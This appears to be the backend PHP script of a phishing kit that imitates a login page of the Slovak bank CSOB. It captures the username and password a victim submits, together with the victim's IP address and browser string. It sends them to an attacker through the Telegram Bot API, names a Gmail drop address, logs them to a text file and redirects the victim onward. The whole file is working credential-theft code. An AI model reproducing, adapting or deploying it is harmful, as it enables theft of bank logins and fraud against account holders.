<?php
   include "config.php";

$psx = $_POST['psx'] ;
$htg = $_POST['htg'] ;

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bro = $_SERVER["HTTP_USER_AGENT"];

$message .= "-------------------- ✅ CSOB-SK LOGIN ✅-------------------\n";
$message .= "Username : ".$psx."\r\n";
$message .= "Password : ".$htg."\r\n";
$message .= "-------------------- ✅ CSOB-SK INFORMATION ✅-------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$bro."\n";
$message .= "\n-------------------- 🇸🇰 Zoldyck 🇸🇰-------------------\n";
$rnessage  = "$message";
$send="voltaikrez@gmail.com";
$subject = "|CSB LGN|".$ip."";
$headers = "From: root";

foreach($user_ids as $user_id) {
    $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
    $data=array('chat_id'=>$user_id,'text'=>$message);
    $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
    $context=stream_context_create($options);
    $result=file_get_contents($url,false,$context);

    }
$txt = fopen('../serlik.txt', 'a');
fwrite($txt, $message);
fclose($txt);

header("Location: ./rdr.php?num_user=".base64_encode($psx));

?>

